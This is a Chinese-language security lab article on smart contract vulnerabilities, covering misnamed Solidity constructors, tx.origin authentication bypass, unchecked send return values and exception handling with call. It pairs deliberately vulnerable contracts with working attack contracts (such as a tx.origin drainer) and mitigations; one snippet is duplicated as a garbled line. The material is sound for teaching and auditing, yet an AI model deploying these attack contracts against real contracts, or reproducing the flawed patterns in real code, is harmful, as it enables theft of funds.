**作者： 天宸@蚂蚁安全实验室  
原文链接：**
上期分享中，灵巧为大家介绍了智能合约安全系列，并揭秘了以太坊特性上多种新漏洞类型。今天我们进入漏洞攻防术-下集，探索以太坊上那些旧貌换新颜的传统漏洞类型。
权限控制问题属于传统的漏洞类型，在绝大多数平台和系统上都有发生。以太坊上目前发现两类权限控制问题：完全无访问控制和有访问控制，但是访问控制不当，没有达到访问控制的效果。
## **权限控制漏洞**
### **合约对用户无访问控制**
**这类问题一个典型的案例是 Constructor 函数定义不当。**
**漏洞介绍**
Constructor 构造函数是特殊函数，在初始化合约时构造函数通常会执行关键的特权任务。在 v0.4.22
之前，构造函数被定义为与合约同名的函数。因此，在开发中更改合约名称时，如果不更改构造函数名称，则它将变为普通的可调用函数，导致被攻击。
**漏洞示例**
如果合约名称被修改，或者在构造函数名称中出现错字，使得它不再与合约名称匹配，则构造函数的行为将像普通函数一样。这可能会导致可怕的后果，尤其是在构造函数正在执行特权操作的情况下，考虑以下合约：
    contract OwnerWallet {
        address public owner;
        //constructor
        function ownerWallet(address _owner) public {
            owner = _owner;
        }
        // fallback. Collect ether.
        function () payable {}
        function withdraw() public {
            require(msg.sender == owner);
            msg.sender.transfer(this.balance);
        }
    }
该合约收集以太币，并且仅允许所有者通过调用 withdraw()
函数来提取所有以太币。出现此问题是由于以下事实：构造函数未在合同之后准确命名。具体来说，ownerWallet 与 OwnerWallet
不同。因此，任何用户都可以调动ownerWallet()函数，将自己设置为所有者，然后通过调用withdraw()获取合同中的所有以太币。
**攻击示例**
任何用户都可以调用 ownerWallet() 函数，将自己设置为所有者，然后通过调用 withdraw() 获取合约中的所有以太币。
**规避建议**
此问题已在0.4.22版的Solidity编译器中得到主要解决。此版本引入了一个 constructor
关键字，该关键字指定构造函数，而不是要求函数名称与合同名称匹配。建议使用此关键字指定构造函数，以防止出现上面突出显示的命名问题。
### **合约对用户访问控制不当**
**这类问题的典型案例是 tx.origin 使用不当，导致访问控制被绕过。**
**漏洞介绍**
合约使用 tx.origin 作为身份认证的凭据，就能够被攻击者巧妙的绕过。攻击者只需要诱骗合约向其掌控的攻击合约发送少量代币，即可绕过 tx.origin
的身份认证。
**漏洞示例**
    pragma solidity ^0.4.18;
    contract TxOriginVictim {    address public owner;    function TxOriginVictim() payable{      owner = ms
    pragma solidity ^0.4.18;
    contract TxOriginVictim {
        address public owner;
        function TxOriginVictim() payable{
          owner = msg.sender;
        }
        function transferTo(address to, uint amount) public {
          require(tx.origin == owner);
          to.call.value(amount)();
        }
        function() payable public {}
        function getBalance() public constant returns (uint256) {
            return this.balance;
        }
        }
**攻击步骤**
攻击代码：
    contract TxOriginAttacker {
        address public owner;
        function TxOriginAttacker() public {
          owner = msg.sender;
        }
        function() payable public {
          TxOriginVictim(msg.sender).transferTo(owner, msg.sender.balance);
        }
        function getBalance() public constant returns (uint256) {
            return this.balance;
        }
    }
攻击步骤：
1.account A 部署 TxOriginVictim 合约，owner 是 account A，转入 10 ether。
2.account B 部署 TxOriginAttacker 合约，owner 是 account B，记录 account B 的余额，为后续做比较。
3.攻击者诱惑受害者向 TxOriginAttacker 转入少量的币，即调用 transferTo 函数向 TxOriginAttacker 地址转账。
4.查看 account B 的余额，可以看到 TxOriginVictim 的币全部转到 account B 账户了，攻击成功。
**规避建议**
禁止使用 tx.origin 作为身份认证的凭据。如需要判定消息来源，可使用 msg.sender 。
## **未检查返回值漏洞**
#### **gasless send 漏洞**
**漏洞介绍**
当使用 send 发送币到一个合约时，可能发生 out of gas 异常。在 0.4.0 之前，send 可用的 gas
数量由发送的币的数量决定，如果发送的币的数量是 0，那么 send 的 gas 数是 0，否则是 2300。在 0.4.0 及之后，send 可用的 gas
数量统一是 2300。
调用 send 发送币到一个合约时，会自动执行该合约的 fallback 函数。如果 fallback
函数中有很“贵”的操作，比如修改了合约的全局变量，那么 2300 gas 不够用，就会抛出 out of gas 异常，转币失败。此时如果调用者没有判断
send 的返回值而默认转币成功，那么可以导致双方账目不平。
**漏洞示例**
    pragma solidity ^0.4.10;
    contract GaslessSend {
        address owner;
        function GaslessSend () payable public{
            owner=msg.sender;
        }
        function pay(uint n, address d) public {
            d.send(n);
        }
        // 便于观察执行是否成功
        function getBalance() constant returns(uint){
            return this.balance;
        }
    }
**攻击步骤**
攻击代码：
    contract D1 {
        uint public count = 0;
        function() payable external {
            count = count+1;
        }
        function getBalance() constant returns(uint){
            return this.balance;
        }
    }
    contract D2  {
        function() payable external {}
        function getBalance() constant returns(uint){
            return this.balance;
        }
    }
攻击步骤：
1.accountA 部署 GaslessSend 合约，并存入 2 ether。
2.accountB 部署 D1 合约。D1合约有很“贵”的操作count+1。
3.accountC 部署 D2 合约。D2合约没有贵的操作。
4.调用 GaslessSend 的 getBalance 函数，查看一下余额，然后把 Gas Limit 设置为 30000，向 D1 转入 2
wei。查看 log，确认交易发送成功。
5.调用 D1 的 getBalance 函数，查看余额，发现 D1 的余额并没有改变，说明转账失败。但 GaslessSend
并不知情，这样会引起双方账目不一致。这是因为D1里有很贵的操作，30000gas不够用，交易会回滚。
6.重复步骤 4、5 向 D2 合约转入 2 wei。查看 D2 合约的余额，发现 D2 余额变为 2
wei，说明转账成功。D2是D1的对比实验，说明尽管调用同一个合约的同一个办法，但由于转账目的合约实现的不同，调用结果也会不同，需识别这种风险。
**规避建议**
在使用 send 函数时，被调用的合约不一定能执行成功，send 会返回 false。要判断 send 的返回值，在 send 返回 false
时，进行相应处理，否则会引起双方账目不一致。
转币函数推荐使用 transfer，transfer 函数执行失败时会抛出异常同时整个状态会回滚，合约开发者能够及时发觉异常信息。
#### **exception disorder 漏洞**
**漏洞介绍**
Solidity 处理异常的方式由函数的调用方式决定。简单来说有两类调用方式：直接调用，通过 call 指令调用。
对于直接调用的方式，如果发生异常，Solidity 会直接 revert 到最顶层的调用栈，所有操作都会被
revert，合约的状态会回到最顶层的调用未发生时的状态。
对于 call 指令的调用，如果发生异常，Solidity 只会 revert 到 call 指令所在的函数。如果 call
指令所在的函数没有判断异常，那么异常不会向上传递，就会导致逻辑混乱。
**漏洞示例**
    contract Alice{
        uint256 public n = 0;
        function pong() public{
            n = n + 1;
            revert();
        }
    }
**攻击步骤**
    contract Bob{
        uint256 public x = 0;
        uint256 public y = 0;
        function ping1(Alice alice) public returns (uint256)  {
            x = 2;
            alice.pong();
            x = 4;
        }
        function ping2(address alice) public returns (uint256)  {
            y = 2;
            alice.call(bytes4(keccak256("pong(uint256)")));
            y = 4;
        }
    }